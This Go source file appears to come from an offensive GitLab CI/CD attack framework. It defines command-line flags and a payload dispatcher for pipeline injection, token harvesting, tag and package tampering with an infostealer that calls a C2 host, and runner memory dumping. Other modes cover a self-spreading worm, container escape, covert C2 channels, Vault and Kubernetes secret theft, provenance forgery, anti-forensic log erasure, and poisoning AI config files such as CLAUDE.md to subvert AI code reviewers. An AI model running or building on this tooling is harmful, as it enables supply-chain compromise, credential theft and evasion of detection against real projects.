	attackCmd.Flags().StringVar(&atkMRTitle, "mr-title", "", "Merge request title (default: 'Update CI configuration')")
	attackCmd.Flags().StringVar(&atkMRDescription, "mr-description", "", "Merge request description (for pwn-request, this is the bash payload that gets executed)")
	attackCmd.Flags().StringVar(&atkMRTargetBranch, "mr-target-branch", "", "Target branch for the merge request (default: project's default branch)")
	// AI injection mode
	attackCmd.Flags().BoolVar(&atkAIInject, "ai-inject", false, "Commit a poisoned AI config file (e.g., CLAUDE.md) to exploit AI code reviewers")
	attackCmd.Flags().StringVar(&atkAIConfigFile, "ai-config-file", "CLAUDE.md", "AI config file to poison (e.g., CLAUDE.md, .cursorrules, .github/copilot-instructions.md)")
	attackCmd.Flags().StringVar(&atkAIPrompt, "ai-prompt", "", "Custom poison prompt content (uses default if empty)")
	attackCmd.Flags().StringVar(&atkAIPromptFile, "ai-prompt-file", "", "Read poison prompt from file")
	// Script injection mode (workflow hopping)
	attackCmd.Flags().BoolVar(&atkInjectScript, "inject-script", false, "Modify repo scripts called by CI (workflow hopping attack)")
	attackCmd.Flags().StringVar(&atkScriptPath, "script-path", "", "Path to script to inject into (auto-detected from CI if empty)")
	attackCmd.Flags().StringVar(&atkScriptPayload, "script-payload", "", "Shell payload to inject into the target script")
	attackCmd.Flags().StringVar(&atkScriptPayloadFile, "script-payload-file", "", "Read injection payload from file")
	attackCmd.Flags().BoolVar(&atkScriptPrepend, "script-prepend", true, "Prepend payload to script (true) or append (false)")
	attackCmd.Flags().BoolVar(&atkTriggerPipeline, "trigger-pipeline", false, "Trigger a pipeline after script injection or LOTP inject")
	// LOTP injection mode
	attackCmd.Flags().BoolVar(&atkLOTPInject, "lotp-inject", false, "Commit weaponized LOTP tool config to branch (Living off the Pipeline attack)")
	attackCmd.Flags().StringVar(&atkLOTPTool, "lotp-tool", "", "LOTP tool to weaponize: npm-gyp|gyp|npm|make|pytest|goreleaser|gradle|terraform (use with --lotp-inject or --payload-only)")
	// Auto-merge mode (supply chain)
	attackCmd.Flags().BoolVar(&atkAutoMerge, "auto-merge", false, "Create MR, self-approve, and merge (supply chain attack)")
	attackCmd.Flags().StringVar(&atkAutoMergeFile, "auto-merge-file", "", "File path to modify in auto-merge (default: .gitlab-ci.yml)")
	attackCmd.Flags().BoolVar(&atkAutoMergeRemove, "auto-merge-remove-branch", true, "Remove source branch after merge")
	// Git hook payload options
	attackCmd.Flags().StringVar(&atkHookType, "hook-type", "", "Git hook type: post-checkout, post-merge, pre-push (default: post-checkout)")
	// Cache poison payload options
	attackCmd.Flags().StringVar(&atkCacheKey, "cache-key", "", "Cache key to target for poisoning (default: default)")
	attackCmd.Flags().StringVar(&atkCachePath, "cache-path", "", "Cache path to poison (default: .)")
	attackCmd.Flags().StringVar(&atkPoisonCmd, "poison-cmd", "", "Command to run for cache poisoning")
	// Harvest mode
	attackCmd.Flags().BoolVar(&atkHarvest, "harvest", false, "Install git hooks on runner, wait for callbacks, harvest tokens")
	attackCmd.Flags().StringVar(&atkHarvestListen, "harvest-listen", ":9443", "Listen address for harvest callback server")
	attackCmd.Flags().StringVar(&atkHarvestTimeout, "harvest-timeout", "30m", "How long to wait for harvest callbacks")
	// Tamper modes
	attackCmd.Flags().BoolVar(&atkTamperRelease, "tamper-release", false, "Tamper with a GitLab release (modify metadata, replace/add asset links)")
	attackCmd.Flags().BoolVar(&atkTamperPackage, "tamper-package", false, "Upload a malicious package to the Generic Packages registry")
	attackCmd.Flags().StringVar(&atkTagName, "tag-name", "", "Tag name (required for --tamper-release and --tamper-tag)")
	attackCmd.Flags().StringVar(&atkReleaseName, "release-name", "", "New release name (--tamper-release)")
	attackCmd.Flags().StringVar(&atkReleaseDesc, "release-description", "", "New release description (--tamper-release)")
	attackCmd.Flags().StringVar(&atkLinkName, "link-name", "", "Release link name to replace (--tamper-release)")
	attackCmd.Flags().StringVar(&atkLinkURL, "link-url", "", "New URL for replaced release link (--tamper-release)")
	attackCmd.Flags().StringVar(&atkAddLinkName, "add-link-name", "", "Name of new release link to add (--tamper-release)")
	attackCmd.Flags().StringVar(&atkAddLinkURL, "add-link-url", "", "URL of new release link to add (--tamper-release)")
	attackCmd.Flags().StringVar(&atkPackageName, "package-name", "", "Package name (--tamper-package)")
	attackCmd.Flags().StringVar(&atkPackageVer, "package-version", "", "Package version (--tamper-package)")
	attackCmd.Flags().StringVar(&atkPackageFile, "package-file", "", "Local file to upload as package (--tamper-package)")
	// Tamper-tag mode (Trivy-style supply chain attack)
	attackCmd.Flags().BoolVar(&atkTamperTag, "tamper-tag", false, "Poison a git tag by replacing a file with a backdoor (Trivy-style supply chain attack)")
	attackCmd.Flags().StringVar(&atkTamperTagFile, "tamper-tag-file", "", "File to replace in the tagged commit tree (default: entrypoint.sh)")
	attackCmd.Flags().StringVar(&atkTamperTagPayload, "tamper-tag-payload", "", "Inline payload content for the replaced file")
	attackCmd.Flags().StringVar(&atkTamperTagPayloadFile, "tamper-tag-payload-file", "", "Read replacement file content from a local file")
	attackCmd.Flags().StringVar(&atkTamperTagSource, "tamper-tag-source", "", "Source ref to base the new commit tree on (default: project default branch HEAD)")
	attackCmd.Flags().StringVar(&atkTamperTagC2, "tamper-tag-c2", "", "C2 URL for auto-generated infostealer payload (used when no explicit payload given)")
	attackCmd.Flags().StringVar(&atkTamperTagEncKey, "tamper-tag-enc-key", "", "AES encryption passphrase for infostealer exfil data")
	attackCmd.Flags().StringVar(&atkTamperTagBackup, "tamper-tag-backup-repo", "", "Backup exfil git repo URL for infostealer payload")
	attackCmd.Flags().BoolVar(&atkTamperTagOriginal, "tamper-tag-preserve-original", false, "Append original file content after payload for stealth")
	attackCmd.Flags().StringVar(&atkTamperTagRSAPubFile, "tamper-tag-rsa-pub", "", "RSA-4096 public key PEM file for hybrid encryption (overrides --tamper-tag-enc-key)")
	attackCmd.Flags().BoolVar(&atkTamperTagProcScan, "tamper-tag-proc-scan", false, "Scan /proc/*/environ for secrets from parallel CI processes")
	attackCmd.Flags().BoolVar(&atkTamperTagMemDump, "tamper-tag-mem-dump", false, "Attempt runner worker memory extraction via /proc/<pid>/mem")
	attackCmd.Flags().BoolVar(&atkTamperTagExtended, "tamper-tag-extended", false, "Extended credential sweep: crypto wallets, shell history, database creds, SSL keys")
	// Cleanup mode and actions
	attackCmd.Flags().BoolVar(&atkCleanup, "cleanup", false, "Enable cleanup mode to remove attack artifacts")
	attackCmd.Flags().StringVar(&atkCleanupBranch, "cleanup-branch", "", "Remove specified branch from target project")
	attackCmd.Flags().BoolVar(&atkCleanupCI, "cleanup-ci", false, "Remove .gitlab-ci.yml from the target branch")
	attackCmd.Flags().Int64Var(&atkRevokeDeployKey, "revoke-deploy-key", 0, "Revoke deploy key by ID from target project")
	attackCmd.Flags().Int64Var(&atkRemoveMemberID, "remove-member-id", 0, "Remove member by user ID from target project")
	// Anti-forensics cleanup flags
	attackCmd.Flags().Int64Var(&atkCleanupPipeline, "cleanup-pipeline", 0, "Delete a specific pipeline by ID (anti-forensics)")
	attackCmd.Flags().BoolVar(&atkCleanupJobs, "cleanup-jobs", false, "Erase job traces on recent pipelines (anti-forensics)")
	attackCmd.Flags().StringVar(&atkCleanupJobsRef, "cleanup-jobs-ref", "", "Limit job trace erasure to pipelines on this ref/branch")
	attackCmd.Flags().IntVar(&atkCleanupJobsMax, "cleanup-jobs-max", 5, "Max recent pipelines to erase job traces from (default: 5)")
	attackCmd.Flags().BoolVar(&atkCleanupJobsDelete, "cleanup-jobs-delete", false, "Also delete pipelines after erasing their job traces")
	// ROR shell listener flags
	attackCmd.Flags().BoolVar(&atkRorListen, "ror-listen", false, "Start a built-in HTTP listener to receive exfiltrated data from ror-shell payloads (requires --commit-ci)")
	attackCmd.Flags().StringVar(&atkRorListenAddr, "ror-listen-addr", ":9444", "HTTP listen address for the ror-shell listener")
	attackCmd.Flags().StringVar(&atkRorListenTimeout, "ror-listen-timeout", "10m", "Timeout for waiting on ror-shell exfil callbacks")
	// Memory dump mode flags
	attackCmd.Flags().BoolVar(&atkMemoryDump, "memory-dump", false, "Inject a CI job that dumps secrets from runner process memory (bypasses masked vars)")
	attackCmd.Flags().StringVar(&atkMemoryDumpProc, "memory-dump-proc", "", "/proc/<pid> to dump (auto-detect if empty)")
	attackCmd.Flags().StringVar(&atkMemoryDumpFilter, "memory-dump-filter", "", "Regex to filter variables (default: .*SECRET|.*TOKEN|.*KEY)")
	// Supply chain worm mode flags
	attackCmd.Flags().BoolVar(&atkSupplyChainWorm, "supply-chain-worm", false, "Self-propagating CI injection across sibling repos (Canisterworm-style)")
	attackCmd.Flags().StringVar(&atkWormPayload, "worm-payload", "", "Payload to inject into sibling repos")
	attackCmd.Flags().IntVar(&atkWormMaxRepos, "worm-max-repos", 5, "Max sibling repos to propagate to")
	attackCmd.Flags().StringVar(&atkWormTargetGroup, "worm-target-group", "", "Group ID/path to scope worm propagation")
	// Container escape mode flags
	attackCmd.Flags().BoolVar(&atkContainerEscape, "container-escape", false, "Exploit privileged Docker executor to escape to host")
	attackCmd.Flags().StringVar(&atkEscapeMountPath, "escape-mount-path", "/", "Host path to mount (default: /)")
	attackCmd.Flags().StringVar(&atkEscapeMethod, "escape-method", "docker", "Escape method: sshd|docker|kernel|nsenter (default: docker)")
	attackCmd.Flags().StringVar(&atkEscapeCommand, "escape-command", "bash", "Command to execute on host (default: bash)")
	// Variable injection mode flags
	attackCmd.Flags().BoolVar(&atkVariableInject, "variable-inject", false, "Inject malicious CI variables into project/group scope")
	attackCmd.Flags().StringVar(&atkInjectVars, "inject-vars", "", "JSON string of var key=value pairs to inject")
	attackCmd.Flags().StringVar(&atkInjectScope, "inject-scope", "project", "Injection scope: project|group")
	attackCmd.Flags().StringVar(&atkInjectGroupID, "inject-group-id", "", "Group ID for group-scope injection")
	attackCmd.Flags().BoolVar(&atkInjectProtected, "inject-protected", false, "Inject as protected variable")
	attackCmd.Flags().BoolVar(&atkInjectMasked, "inject-masked", false, "Inject as masked variable")
	// C2 covert channel mode flags
	attackCmd.Flags().BoolVar(&atkC2Channel, "c2-channel", false, "Establish a covert C2 channel via DNS tunnel, steganography, ICMP")
	attackCmd.Flags().StringVar(&atkC2Method, "c2-method", "dns-a", "C2 method: dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)")
	attackCmd.Flags().StringVar(&atkC2Target, "c2-target", "", "Domain/URL for the C2 channel")
	attackCmd.Flags().BoolVar(&atkC2KeepAlive, "c2-keepalive", false, "Keep C2 channel alive with heartbeats")
	attackCmd.Flags().StringVar(&atkC2CallbackURL, "c2-callback-url", "", "C2 callback URL")
	// npm tamper mode flags
	attackCmd.Flags().BoolVar(&atkNpmTamper, "npm-tamper", false, "Inject preinstall hooks into npm packages via CI (supply chain attack)")
	attackCmd.Flags().StringVar(&atkNpmRegistry, "npm-registry", "", "npm registry URL (default: https://registry.npmjs.org)")
	attackCmd.Flags().StringVar(&atkNpmPackage, "npm-package", "", "Specific npm package to tamper (auto-discover if empty)")
	attackCmd.Flags().StringVar(&atkNpmInjectScript, "npm-inject-script", "", "Preinstall hook content to inject into package.json")
	// Vault enumeration mode flags
	attackCmd.Flags().BoolVar(&atkVaultEnum, "vault-enum", false, "Enumerate and exfiltrate secrets from reachable HashiCorp Vault instances")
	attackCmd.Flags().StringVar(&atkVaultAddr, "vault-addr", "", "Vault server URL (falls back to $VAULT_ADDR)")
	attackCmd.Flags().StringVar(&atkVaultAuthMethod, "vault-auth-method", "", "Vault auth method: token|kubernetes|aws (default: token)")
	// K8s secrets sweep mode flags
	attackCmd.Flags().BoolVar(&atkK8sSecrets, "k8s-secrets", false, "Sweep Kubernetes secrets via runner pod service account")
	attackCmd.Flags().StringVar(&atkK8sNamespaces, "k8s-namespaces", "", "Comma-separated Kubernetes namespaces to target (empty = discover all)")
	// Dead Man's Switch mode flags
	attackCmd.Flags().BoolVar(&atkDeadManSwitch, "dead-man-switch", false, "Install persistence with token revocation detection (Dead Man's Switch)")
	attackCmd.Flags().StringVar(&atkDMSMonitorURL, "dms-monitor-url", "", "Endpoint to probe with token (default: GitLab /api/v4/user)")
	attackCmd.Flags().StringVar(&atkDMSInterval, "dms-interval", "", "Seconds between checks (default: 60)")
	attackCmd.Flags().StringVar(&atkDMSTTL, "dms-ttl", "", "Seconds before self-removal (default: 86400)")
	attackCmd.Flags().StringVar(&atkDMSHandler, "dms-handler", "", "Command to run on token revocation")
	attackCmd.Flags().StringVar(&atkDMSPlatform, "dms-platform", "", "Platform: linux|macos (default: linux)")
	// Branch mutator mode flags
	attackCmd.Flags().BoolVar(&atkBranchMutator, "branch-mutator", false, "Iterate unprotected branches and commit a file to each (mass CI poisoning)")
	attackCmd.Flags().StringVar(&atkMutatorFile, "mutator-file", "", "File to create/update on each branch (default: .gitlab-ci.yml)")
	attackCmd.Flags().StringVar(&atkMutatorContent, "mutator-content", "", "Content to write to each branch")
	attackCmd.Flags().IntVar(&atkMutatorMaxBranches, "mutator-max-branches", 10, "Max branches to target (default: 10)")
	// Sigstore provenance forgery mode flags
	attackCmd.Flags().BoolVar(&atkSigstore, "sigstore", false, "Forge Sigstore provenance attestations via CI OIDC tokens")
	attackCmd.Flags().StringVar(&atkSigstorePackage, "sigstore-package", "", "Package name for the attestation subject")
	attackCmd.Flags().StringVar(&atkSigstoreVersion, "sigstore-version", "", "Package version for the attestation")
	// Shared co-author trailer
	attackCmd.Flags().StringVar(&atkCoAuthor, "co-author", "", "Co-Authored-By trailer for commits")
}

func loadCIContent(inline, file string, fromStdin bool) (string, error) {
	if strings.TrimSpace(inline) != "" {
		// Interpret common escape sequences so users can pass YAML
		// on a single line: --ci-yaml 'stages:\n  - test\n...'
		s := strings.ReplaceAll(inline, `\n`, "\n")
		s = strings.ReplaceAll(s, `\t`, "\t")
		return s, nil
	}
	if strings.TrimSpace(file) != "" {
		b, err := os.ReadFile(filepath.Clean(file)) //nolint:gosec // G703: file path provided by user via CLI flag
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	if fromStdin {
		b, err := ioReadAll(os.Stdin)
		if err != nil {
			return "", err
		}
		return string(b), nil
	}
	return "", nil
}

// small indirection for testing stdin reads
var ioReadAll = func(f *os.File) ([]byte, error) { return io.ReadAll(f) }

// renderPayload builds a payload YAML based on selected flags.
func renderPayload() (string, error) {
	p := strings.ToLower(strings.TrimSpace(atkPayload))
	// Build common options
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	common := payloadgen.CommonOptions{
		JobName:         strings.TrimSpace(atkJobName),
		Stage:           strings.TrimSpace(atkStage),
		Image:           strings.TrimSpace(atkImage),
		Tags:            tags,
		Manual:          atkManual,
		ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
		ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
	}
	switch p {
	case "ror-shell":
		return payloadgen.GenerateRORShellYAML(payloadgen.RORShellOptions{
			Common:       common,
			Command:      atkCmd,
			DownloadPath: atkDownload,
		}), nil
	case payloadPwnRequest:
		return payloadgen.GeneratePwnRequestYAML(payloadgen.PwnRequestOptions{
			Common:           common,
			TargetBranchExpr: strings.TrimSpace(atkTargetBranchRegex),
		}), nil
	case payloadRor, payloadRunnerOnRunner, payloadRunnerOnRunnerAlt:
		return payloadgen.GenerateRunnerOnRunnerYAML(payloadgen.RunnerOnRunnerOptions{
			Common:           common,
			ScriptURL:        strings.TrimSpace(atkScriptURL),
			TargetOS:         strings.TrimSpace(atkOS),
			KeepAliveSeconds: atkKeepAlive,
		}), nil
	case payloadNestedRunner:
		return payloadgen.GenerateNestedRunnerYAML(payloadgen.NestedRunnerOptions{
			Common:            common,
			AttackerGitLabURL: strings.TrimSpace(atkNestedGitLabURL),
			RegistrationToken: strings.TrimSpace(atkNestedRegToken),
			RunnerName:        strings.TrimSpace(atkNestedName),
			RunnerTags:        strings.TrimSpace(atkNestedTags),
			Executor:          strings.TrimSpace(atkNestedExecutor),
			CallbackURL:       strings.TrimSpace(atkNestedCallback),
			RunnerVersion:     strings.TrimSpace(atkNestedVersion),
		}), nil
	case "secrets", "secrets-exfil", "secrets_exfil":
		return payloadgen.GenerateSecretsExfilYAML(payloadgen.SecretsExfilOptions{
			Common:      common,
			WebhookURL:  strings.TrimSpace(atkWebhook),
			ExfilMethod: strings.TrimSpace(atkExfilMethod),
			ExfilTarget: strings.TrimSpace(atkExfilTarget),
		}), nil
	case "git-hook", "git_hook", "githook":
		return payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
			HookType:    strings.TrimSpace(atkHookType),
		}), nil
	case "cache-poison", "cache_poison", "cachepoison":
		return payloadgen.GenerateCachePoisonYAML(payloadgen.CachePoisonOptions{
			Common:    common,
			CacheKey:  strings.TrimSpace(atkCacheKey),
			CachePath: strings.TrimSpace(atkCachePath),
			PoisonCmd: strings.TrimSpace(atkPoisonCmd),
		}), nil
	case "infostealer", "info-stealer", "info_stealer":
		c2 := strings.TrimSpace(atkTamperTagC2)
		if c2 == "" {
			c2 = strings.TrimSpace(atkWebhook)
		}
		if c2 == "" {
			c2 = "https://example.invalid/callback"
		}
		return payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
			C2URL:           c2,
			EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
			BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
			ProcScan:        atkTamperTagProcScan,
			MemoryDump:      atkTamperTagMemDump,
			Extended:        atkTamperTagExtended,
		}), nil
	case "memory-dump", "memory_dump", "memorydump":
		c2 := strings.TrimSpace(atkWebhook)
		return payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
			Common:      common,
			CallbackURL: c2,
			ProcScan:    true,
			MemoryDump:  true,
			Extended:    true,
		}), nil
	case "supplychain-worm", "supplychain_worm", "supplychainworm":
		return payloadgen.GenerateSupplyChainWormYAML(payloadgen.SupplyChainWormOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
			ExfilMethod: strings.TrimSpace(atkExfilMethod),
			ExfilTarget: strings.TrimSpace(atkExfilTarget),
		}), nil
	case "container-escape", "container_escape", "containerescape":
		return payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
			Common:       common,
			EscapeMethod: strings.TrimSpace(atkEscapeMethod),
			EscapeCmd:    strings.TrimSpace(atkEscapeCommand),
			MountPath:    strings.TrimSpace(atkEscapeMountPath),
			HostCommand:  strings.TrimSpace(atkCmd),
			ExfilMethod:  strings.TrimSpace(atkExfilMethod),
			ExfilTarget:  strings.TrimSpace(atkExfilTarget),
		}), nil
	case "variable-inject", "variable_inject", "variableinject", "var-inject":
		return payloadgen.GenerateVariableInjectionYAML(payloadgen.VariableInjectionOptions{
			Common:      common,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "c2-channels", "c2_channels", "c2channels", "c2-channel", "c2channel":
		return payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
			Common:      common,
			ExfilMethod: strings.TrimSpace(atkC2Method),
			ExfilTarget: strings.TrimSpace(atkC2Target),
			KeepAlive:   atkC2KeepAlive,
			CallbackURL: strings.TrimSpace(atkC2CallbackURL),
		}), nil
	case "npm-tamper", "npm_tamper", "npmtamper":
		return payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
			Common:         common,
			RegistryURL:    strings.TrimSpace(atkNpmRegistry),
			PackageName:    strings.TrimSpace(atkNpmPackage),
			InjectedScript: strings.TrimSpace(atkNpmInjectScript),
			CallbackURL:    strings.TrimSpace(atkWebhook),
		}), nil
	case "vault-enum", "vault_enum", "vaultenum":
		return payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
			Common:      common,
			VaultAddr:   strings.TrimSpace(atkVaultAddr),
			AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "k8s-secrets", "k8s_secrets", "k8ssecrets":
		var ns []string
		if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
			for n := range strings.SplitSeq(s, ",") {
				n = strings.TrimSpace(n)
				if n != "" {
					ns = append(ns, n)
				}
			}
		}
		return payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
			Common:      common,
			Namespaces:  ns,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "dead-mans-switch", "dead_mans_switch", "deadmanswitch", "dms":
		return payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
			Common:        common,
			MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
			CheckInterval: strings.TrimSpace(atkDMSInterval),
			TTL:           strings.TrimSpace(atkDMSTTL),
			Handler:       strings.TrimSpace(atkDMSHandler),
			Platform:      strings.TrimSpace(atkDMSPlatform),
		}), nil
	case "branch-mutator", "branch_mutator", "branchmutator":
		return payloadgen.GenerateBranchMutatorYAML(payloadgen.BranchMutatorOptions{
			Common:      common,
			FilePath:    strings.TrimSpace(atkMutatorFile),
			FileContent: strings.TrimSpace(atkMutatorContent),
			MaxBranches: atkMutatorMaxBranches,
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	case "sigstore", "sigstore-provenance":
		return payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
			Common:      common,
			PackageName: strings.TrimSpace(atkSigstorePackage),
			Version:     strings.TrimSpace(atkSigstoreVersion),
			CallbackURL: strings.TrimSpace(atkWebhook),
		}), nil
	default:
		return "", fmt.Errorf("unsupported --payload: %s", atkPayload)
	}
}

// newRorShellListener creates a new ror listener instance.
func newRorShellListener(listenAddr string, out io.Writer) *Listener {
	return NewListener(listenAddr, out)
}

// resultsToMap converts listener results to a map of maps for DB persistence.
func resultsToMap(results []*CallbackResult) map[string]string {
	combined := make(map[string]string)
	for _, r := range results {
		maps.Copy(combined, r.Secrets)
	}
	return combined
}

// parsePipelineURL extracts the pipeline ID from a GitLab pipeline URL string.
// URL format: https://gitlab.com/group/project/-/pipelines/123
func parsePipelineURL(pipelineURL string) (int64, error) {
	parts := strings.Split(pipelineURL, "/")
	for i := len(parts) - 1; i >= 0; i-- {
		if parts[i] == "pipelines" && i+1 < len(parts) {
			var id int64
			_, err := fmt.Sscanf(parts[i+1], "%d", &id)
			return id, err
		}
	}
	return 0, nil
}

// parseTags splits a comma-separated tag string into a slice.
func parseTags(raw string) []string {
	var tags []string
	if strings.TrimSpace(raw) != "" {
		for t := range strings.SplitSeq(raw, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	return tags
}

// commitPayloadToBranch handles the common pattern of: deconflict branch →
// create attacker → setup user → ensure branch → upsert .gitlab-ci.yml.
// Returns the resolved branch name on success.
func commitPayloadToBranch(ctx context.Context, client *gitlabx.Client, target, branch, deconflict, authorName, authorEmail, message, yaml string) (string, error) {
	finalBranch, err := ensureBranchDeconflict(ctx, client, target, branch, deconflict, authorName, authorEmail)
	if err != nil {
		return "", err
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return "", fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, target, finalBranch); err != nil {
		return "", err
	}
	if err := att.UpsertFile(ctx, target, finalBranch, ".gitlab-ci.yml", yaml, message); err != nil {
		return "", err
	}
	return finalBranch, nil
}

// ifErr returns err.Error() or empty string — used inline in variable-inject JSON output.
func ifErr(err error) string {
	if err != nil {
		return err.Error()
	}
	return ""
}
